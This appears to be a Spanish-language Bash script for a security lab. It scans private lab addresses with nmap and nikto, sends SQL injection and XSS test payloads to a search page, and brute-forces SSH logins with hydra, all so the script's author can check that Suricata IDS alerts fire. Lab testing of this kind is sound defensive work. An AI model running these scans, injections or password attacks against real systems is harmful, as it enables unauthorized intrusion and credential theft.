#!/usr/bin/env bash
# =============================================================================
# attack-lab.sh — Script corto de ataque para el laboratorio (ejecutar SOLO en Kali)
# Uso: ./attack-lab.sh [DMZ_IP] [LAN_DB_IP]
# Por defecto: DMZ=192.168.20.10  DB=192.168.10.20
# =============================================================================
set -euo pipefail

DMZ_IP="${1:-192.168.20.10}"
DB_IP="${2:-192.168.10.20}"
WAN_IF="${WAN_IF:-eth0}"
STAMP="$(date +%Y%m%d-%H%M%S)"
OUT_DIR="${OUT_DIR:-./lab-evidencias-ataque-${STAMP}}"

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

warn() { echo -e "${RED}[LAB-ONLY]${NC} $*"; }
info() { echo -e "${GREEN}[*]${NC} $*"; }

if [[ "$(id -u)" -ne 0 ]]; then
  echo "Ejecuta como root en Kali: sudo $0 $*"
  exit 1
fi

warn "Solo usar contra IPs del laboratorio autorizado. Ctrl+C para cancelar."
sleep 2

mkdir -p "$OUT_DIR"
info "Salida en: $OUT_DIR"

info "1/5 — Escaneo agresivo Nmap (DMZ + puertos críticos BD desde WAN)"
nmap -Pn -sS -sV -T4 --open -p- "$DMZ_IP" \
  -oA "$OUT_DIR/nmap-agresivo-dmz" 2>&1 | tee "$OUT_DIR/nmap-agresivo-dmz.log"

nmap -Pn -sS -p 22,80,443,5432,21,3306 "$DB_IP" \
  -oA "$OUT_DIR/nmap-wan-to-db" 2>&1 | tee "$OUT_DIR/nmap-wan-to-db.log"

info "2/5 — Enumeración web (nikto + rutas típicas)"
if command -v nikto >/dev/null; then
  nikto -h "http://${DMZ_IP}" -o "$OUT_DIR/nikto-dmz.txt" 2>&1 | tee "$OUT_DIR/nikto-dmz.log" || true
fi

for path in / /backup/ /search.php /phpinfo.php /admin/; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "http://${DMZ_IP}${path}" || echo "000")
  echo "GET ${path} -> HTTP ${code}" | tee -a "$OUT_DIR/curl-paths.txt"
done

info "3/5 — Pruebas SQLi / XSS en parámetros (generar alertas IDS)"
curl -s "http://${DMZ_IP}/search.php?q=test' OR '1'='1" -o "$OUT_DIR/sqli-response.html" \
  -w "sqli HTTP %{http_code}\n" 2>&1 | tee -a "$OUT_DIR/curl-paths.txt" || true
curl -s "http://${DMZ_IP}/search.php?q=<script>alert(1)</script>" -o /dev/null \
  -w "xss HTTP %{http_code}\n" 2>&1 | tee -a "$OUT_DIR/curl-paths.txt" || true

info "4/5 — Fuerza bruta SSH acotada (máx. 16 intentos)"
if command -v hydra >/dev/null; then
  hydra -l lab -P /usr/share/wordlists/fasttrack.txt -t 4 -f -V \
    "ssh://${DMZ_IP}" 2>&1 | tee "$OUT_DIR/hydra-ssh-dmz.log" || true
else
  echo "hydra no instalado — omitido" >> "$OUT_DIR/hydra-ssh-dmz.log"
fi

info "5/5 — Resumen rápido"
{
  echo "=== attack-lab.sh ==="
  echo "Fecha: $(date -Iseconds)"
  echo "DMZ: $DMZ_IP | DB (desde WAN): $DB_IP"
  echo "Interfaz: $(ip -br addr show "$WAN_IF" 2>/dev/null || echo 'desconocida')"
  echo ""
  echo "--- Puertos abiertos DMZ (grep) ---"
  grep -E "^[0-9]+/" "$OUT_DIR/nmap-agresivo-dmz.gnmap" 2>/dev/null || true
  echo ""
  echo "--- Siguiente paso ---"
  echo "Revisar alertas en pfSense: Services > Suricata > Alerts"
  echo "Revisar syslog: srv-syslog o contenedor Docker"
} | tee "$OUT_DIR/RESUMEN.txt"

info "Ataque de laboratorio finalizado. Revisa Suricata y logs remotos."
